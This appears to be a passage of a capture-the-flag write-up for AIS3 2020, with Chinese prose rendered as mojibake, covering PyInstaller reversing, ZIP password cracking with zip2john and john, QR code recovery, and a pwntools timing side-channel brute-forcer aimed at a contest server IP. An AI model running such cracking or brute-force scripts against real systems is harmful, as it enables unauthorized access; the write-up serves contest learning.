[+] Python version: 38
[+] Length of package: 9518557 bytes
[+] Found 955 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth__tkinter.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: rose.pyc
[+] Found 258 files in PYZ archive
[+] Successfully extracted pyinstaller archive: La_vie_en_rose.exe
````

é€™æ™‚å€™å°±å¯ä»¥æ‰¾åˆ°æˆ‘å€‘æœ€ä¸»è¦æƒ³æ”»æ“Šçš„ `rose.pyc`ã€‚
![](/assets/images/posts/ais3-2020-writeup/ul6QnAx.png)

å•é¡Œä¾†äº†ï¼`pyc` åŸºæœ¬ä¸Šæ˜¯ Python éƒ½å·²ç¶“ç·¨è­¯æˆ bytecode äº†ï¼Œç„¶å¾Œæˆ‘ä¸è«–è©¦ `uncompyle6`, `decompyle3`, `pycdc` éƒ½ç„¡æ³•æ¨å›åˆ°åŸä¾†çš„ Python æª”ã€‚æˆ‘ç›¸ä¿¡åŸä½œè€…çš„ç”¨æ„æ˜¯è¦æˆ‘å€‘å»ä¿® `rose.pyc` çš„ byte æŠŠæœ‰å•é¡Œçš„ä¿®æ­£å›æ­£ç¢ºçš„ã€‚

ä½†æˆ‘ç•¶æ™‚æ€éº¼è©¦éƒ½æ²’è¾¦æ³•ï¼Œæ‰€ä»¥æˆ‘æ±ºå®šåšäº†ä»¶å¾ˆè ¢çš„äº‹ï¼é‡é ­ä¾ `pycdas` æ‰€å»ºç«‹å‡ºä¾†çš„ Python disassembly bytecode æ¨å›å» Python æª”ã€‚é€™å€‹éƒ¨åˆ†èµ·ç¢¼èŠ±äº†æˆ‘å¥½å¹¾å€‹å°æ™‚ï¼Œä¸€ç›´è©¦ Code ç„¶å¾Œå‘¼å« python `dis` æ¯”è¼ƒ bytecodeé‚„æœ‰ç¿»[å®˜æ–¹ bytecode æŠ€è¡“æ–‡ä»¶](https://docs.python.org/3/library/dis.html)ã€‚

![](/assets/images/posts/ais3-2020-writeup/i48c924.png)

![](/assets/images/posts/ais3-2020-writeup/OjlxVSg.png)

æ–¼æ˜¯ä¹ï¼Œæˆ‘æœ€å¾Œæ¨å‡ºäº†æœ€é—œéµçš„å¹¾è¡Œ codeï¼š

```python
import dis
from itertools import chain, product

def run():
    chars = ('a','w', 's', 'e', 'd', 'f', 't', 'g', 'y', 'h', 'u','j', 'k', 'o', 'l', 'p', ';', "'", '[', ']', ' ')
    constraints = [216,219,222,219,216,219,222,219,216,219,222,202,150,167,219,219,216,219,222,219,216,219,222,219,216,219,222,202,150,167,219,219,216,219,222,219,216,219,222,219,216,219,222,202,150,167,219,219,216,219,222,217,212,210,208,210,212,210,208,136,140,216,219,222,219,216,219,222,219,216,219,222,202,150,167,219,219,216,219,222,219,216,219,222,219,216,219,222,217,217,219,167,150,182,199,216,219,222,219,216,212,208,208,208,149,149,210,217,219,167,150,182,199,216,219,222,219,216,211,206,0,-3,0,3,0,-3,0,3,0,-3,0,20,32,-49,-3,3,0,-3,0,3,0,-3,0,3,0,-3,0,20,32,-49,-3,3,0,-3,0,3,0,-3,0,3,0,-3,0,20,32,-49,-3,3,0,-3,0,5,0,2,0,-2,0,2,0,72,-76,0,-3,0,3,0,-3,0,3,0,-3,0,20,32,-49,-3,3,0,-3,0,3,0,-3,0,3,0,-3,0,5,-5,3,49,-32,0,-17,0,-3,0,3,0,4,0,0,0,59,-59,-2,-5,3,49,-32,0,-17,0,-3,0,3,0,5,0]
    secret = [62,9,11,79,0,5,4,10,76,30,0,28,62,72,76,9,5,0,3,28,76,1,22,79,8,30,10,14,54,72,102,46,2,8,79,13,30,5,1,8,31,76,2,10,123,79,3,79,24,4,10,79,26,6,9,11,15,74,17,7,85,76,30,10,28,24,102,56,7,5,24,10,79,50,72,76,12,3,0,11,79,13,2,11,79,13,0,24,14,19,28,76,66,62,58,30,2,6,1,11,102,42,29,26,12,72,6,15,11,76,89,34,123,13,76,29,0,21,13,11,71,24,9,28,27,102,46,3,14,15,7,79,27,51,94,76,13,9,13,28,27,76,8,10,28,15,9,1,11,40,27,10,29,3,1,79,28,4,13,11,0,27,31,101,54,62,87,0,0,27,76,13,10,11,31,28,17,74,8,29,26,78,31,102,40,0,0,8,101,14,2,8,79,45,15,108,76,9,76,0,79,14,76,11,79,6,76,31,79,46,74,38,76,104,123,104,76,23,27,7,93,31,55,14,4,92,74,55,24,10,8,100,55,50,7,95,48,29,3,31,84,20,51,10,94,3,0,31,48,27,13,93,24,14,53,70]
    notes = input()
    print(notes)
    result = []
    notes = list(map(ord, notes))
    for i in range(len(notes) -1):
        result.append(notes[i] + notes[i+1])
    for i in range(len(notes) -1):
        result.append(notes[i] - notes[i+1])
    if (result == constraints):
        flag = ''.join(map(chr,[secret[i] ^ notes[i % len(notes)] for i in range(len(secret))]))
        print(flag)

#dis.dis(run)
run()
```

æˆ‘å¾Œä¾†åˆå¡äº†å¥½å¹¾å€‹å°æ™‚ï¼›æˆ‘ç¬¬ä¸€æ¬¡æ²’æœ‰çœ‹å‡ºä¾†é€™æ˜¯ Fibonacci æ•¸åˆ—ã€‚é‚è¼¯æœ‰æ™‚å€™é —çˆ›ç„¶å¾Œå°æ•¸å­—æ²’ä»€éº¼æ„Ÿè¦ºã€‚ç¸½ä¹‹ï¼Œæœ€å¾Œæ˜¯æœ‰è³‡ç§‘ç³»åŒå­¸å‰›å¥½åœ¨æˆ‘èº«æ—çœ‹åˆ°æ¨äº†æˆ‘ä¸€æŠŠæ‰çœ‹æ‡‚ã€‚æœ€å¾Œæ¨å‡ºä¾†æ‰€æœ‰çš„æŒ‰éµæ‡‰è©²æ˜¯ `lloolloolloo[;lolloolloolloo[;lolloolloolloo[;lolloojjhhjjhh lloolloolloo[;lolloolloolloojol;[[lloollhhhh-hjol;[[lloollgg`. æœ€å¾Œæ’­å®Œå™´ Flagã€‚

![](/assets/images/posts/ais3-2020-writeup/38IF3XJ.png)

Flag:
`AIS3{th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan}`

## Misc

### ğŸ’¤ Piquero (100 pt.)

![](/assets/images/posts/ais3-2020-writeup/2dA2K5Q.jpg)

![](/assets/images/posts/ais3-2020-writeup/jQHwDD4.jpg)

<!-- æˆ‘ä¸€é–‹å§‹çœ‹åˆ°é€™é¡Œçš„æ™‚å€™å…§å¿ƒè¦ºå¾—ä¸»è¾¦åœ¨ææˆ‘å€‘ã€‚!-->

é€™é¡Œå°±å¾ˆç„¡è…¦çš„ç…§è‘—é»å­—é€éåƒæ˜¯ decode.fr æ…¢æ…¢è§£ã€‚æ²’æœ‰ç•™ Flagã€‚

![](/assets/images/posts/ais3-2020-writeup/GV8ZvhF.png)

### ğŸ¥ Karuego (100 pt.)

é€™ç¨®åªæœ‰åœ–ç‰‡çš„é¡Œç›®ä¸å¤–ä¹æ˜¯è—åœ¨ EXIF ä¸ç„¶å°±æ˜¯è—åœ¨é€™å¼µç…§ç‰‡çš„æŸå€‹å€æ®µï¼Œæ‰€ä»¥æˆ‘å€‘å…ˆç”¨ `binwalk` æª¢æŸ¥ã€‚

```shell
â¯ binwalk Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 2880 x 1492, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files/
2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg
2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files/Demon.png
3260899       0x31C1E3        End of Zip archive, footer length: 22
```

çœ‹èµ·ä¾†çš„ç¢ºæ˜¯æœ‰è—æ±è¥¿ï¼Œæˆ‘å€‘ç”¨ `-e` æ‹‰å‡ºä¾†çœ‹çœ‹å§ï¼Œæœ€å¾Œæˆ‘å€‘ç™¼ç¾è£¡é¢æœ‰ä¸€å€‹ZIPæª”ã€‚

![](/assets/images/posts/ais3-2020-writeup/0y8L2ah.png)

å¾ˆå¯æƒœçš„ï¼Œæ²’é‚£éº¼ç°¡å–®ã€‚

![](/assets/images/posts/ais3-2020-writeup/DVuodd0.png)

é€™æ™‚å€™å°±å¾—æ¬å‡º John the Ripper å›‰ï¼John the Ripperä¸­çš„ `zip2john` å¯ä»¥å¹«åŠ©æˆ‘å€‘æ’ˆå‡ºé€™å€‹ ZIP file çš„æ‰€æœ‰ Hashï¼Œæ¥è‘—å°±å¯ä»¥é€é `john` ä¾†é€²è¡Œ dictionary attackã€‚

```shell
â¯ zip2john.exe .\1F6D30.zip > out.hash
```

![](/assets/images/posts/ais3-2020-writeup/fBUnrle.jpg)

æˆ‘å€‘æ’ˆå‡º Hash ä¹‹å¾Œå°±å¯ä»¥å¡çµ¦ `john` å¹«æˆ‘å€‘åšäº‹äº†ï¼

```shell
â¯ john.exe out.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 24 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 4 candidates buffered for the current salt, minimum 24 needed for performance.
Proceeding with wordlist:/run/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
lafire           (1F6D30.zip)
1g 0:00:00:14 DONE 3/3 (2020-06-20 01:48) 0.06757g/s 6074Kp/s 6074Kc/s 6074KC/s 2tzbr1..lirono
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

å‡ºä¾†ä¹‹å¾Œæˆ‘å€‘å°±çŸ¥é“é€™å€‹ zip çš„å¯†ç¢¼æ˜¯ `lafire`ï¼Œé€™æ™‚å°±å¯ä»¥å»é–‹ Flag äº†ã€‚

![](/assets/images/posts/ais3-2020-writeup/Y2lzuXE.png)

### ğŸŒ± Soy (139 pt.)

![](/assets/images/posts/ais3-2020-writeup/yCCp9U3.png)

é€™é¡Œæ˜¯ QR Code recoveryï¼Œæœ€è¿‘[å¤§å®¶ä¼¼ä¹éƒ½å¾ˆå–œæ­¡è€ƒé€™é¡Œ](https://hsctf.com/)ã€‚å¾ˆå¯æƒœçš„ï¼ŒQRazyBox ä¸æ˜¯å¾ˆå–œæ­¡é€™ç¨®è¢«è“‹æ‰é‡è¦éƒ¨ä»½çš„ QR Codeã€‚

![](/assets/images/posts/ais3-2020-writeup/ODAaW8P.png)

é€™æ™‚å€™å°±å¾—äººå·¥ä»‹å…¥äº†ï¼Œæˆ‘å€‘ä¾éƒ¨ä»½é»‘é»å¯ä»¥éš±ç´„çœ‹å‡ºå“ªéƒ¨åˆ†æœ‰å¯èƒ½æ˜¯é»‘çš„æˆ–ç™½çš„ã€‚æˆ‘å€‘å¯ä»¥é€é Brightness & Contrast èª¿æ•´å¹«åŠ© QRazyBox è¾¨è­˜ã€‚

![](/assets/images/posts/ais3-2020-writeup/FwLVG94.png)

![](/assets/images/posts/ais3-2020-writeup/VTM1LQX.png)

æ¥è‘—æˆ‘å€‘åœ¨äººå·¥æŠŠ Position éƒ¨åˆ†è·Ÿ Finder åŠ å›å»ã€‚

![](/assets/images/posts/ais3-2020-writeup/rWkRJAw.png)

é€™æ™‚å€™ä¸Ÿé€² QRazyBox å°±å¥½äº†ã€‚

![](/assets/images/posts/ais3-2020-writeup/gEJgFlK.png)

æ¥è‘—æˆ‘å€‘å¯ä»¥å¼·åˆ¶è¦æ±‚ QRazyBox æŠŠè®€å¾—å‡ºä¾†çš„æ±è¥¿æ‹‰å‡ºä¾†ã€‚

![](/assets/images/posts/ais3-2020-writeup/4WdIisY.png)

```
QR version : 2 (25x25)
Error correction level : L
Mask pattern : 0
Number of missing bytes (erasures) : 0 bytes (0.00%)
Data blocks :
["01000010","00000100","00010100","10010101","00110011","00110111","10110100","10000011","00000111","01110101","11110110","00110011","01000110","11100101","11110111","10010011","00000111","01010101","11110110","01100011","00010110","11100110","01000101","11110110","11010110","01010011","11110010","00010011","11110010","00010011","11110010","00010010","00010110","11010000","00101111","11010001","11110100","11011010","10001110","10110011","11010101","00100100","11011101","00110011"]
Final data bits :
01000010000001000001010010010101001100110011011110110100100000110000011101110101111101100011001101000110111001011111011110010011000001110101010111110110011000110001011011100110010001011111011011010110010100111111001000010011111100100001001111110010000100100001011011010000
[0100] [00100000] [0100000101001001001010010100110010011001101101111011010010010000010011000001101110111010010111110110110001100100110100011011011100100101111101101111001001001100000110111010101001011111011011001100010011000101101101110011011001000100101111101101101101011011001010010011111100100100001001001111110010010000100100111111001001000010010010000101101101101000]
Mode Indicator : 8-bit Mode (0100)
Character Count Indicator : 32
Decoded data : AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!m
Final Decoded string : AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!m
```

é€™æ™‚æˆ‘å€‘å°±å¯ä»¥çŒœå‡ºFlagäº†ã€‚

Flag:
`AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}`

### ğŸ‘‘ Saburo (359 pt.)

é€™é¡Œç´”ç²¹ç”¨ pwntools ä¸€ç›´æš´åŠ›æˆ³å°æ–¹ä¼ºæœå™¨ï¼Œé–‹äº†ä¸€å † Pool ç‹‚æˆ³ã€‚

```python
from pwn import remote
from string import printable
from multiprocessing import Pool, Array, Manager
from traceback import print_exception

def handle_error(e):
    print_exception(type(e), e, e.__traceback__)

def get_range(flag, index):
    Min = float("inf")
    for _ in range(50):
        with remote("60.250.197.227", 11001) as r:
            r.sendline(flag.encode())
            rep = r.recvline().decode()
            if "lose" in rep:
                sec = int(rep.split(' ')[5])
                Min = min(Min, sec)
            else:
                r.interactive()
    cur_min[index] = Min

doc = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?_{}"
ans = "AIS3{A1r1ght_U_4r3_my_3n3"
cur_min = Manager().list(list(map(lambda _: 0, range(len(doc)))))

while True:
    p = Pool(processes=16, maxtasksperchild=8)
    for i in range(len(doc)):
        p.apply_async(get_range, args=(ans+doc[i], i), error_callback=handle_error)
    p.close()
    p.join()
    cur_min = list(cur_min)
    ans += doc[cur_min.index(max(cur_min))]
    print(f"\n\n{ans}\n\n")
    with open("./Saburo_ans2", mode="a") as f:
        f.write(f"{ans}\n")
    
    cur_min = Manager().list(list(map(lambda _: 0, range(len(doc)))))

```

æˆ‘æˆ³åˆ° `AIS3{A1r1ght_U_4r3_my_3n3` é€™è£¡å¤§æ¦‚å°±çŸ¥é“å‰©ä¸‹æ‡‰è©²æ˜¯ `enemies`ï¼Œæ‰€ä»¥å‰›å¥½å°±çŒœä¸­äº†ã€‚

Flag:
`AIS3{A1r1ght_U_4r3_my_3n3ies}`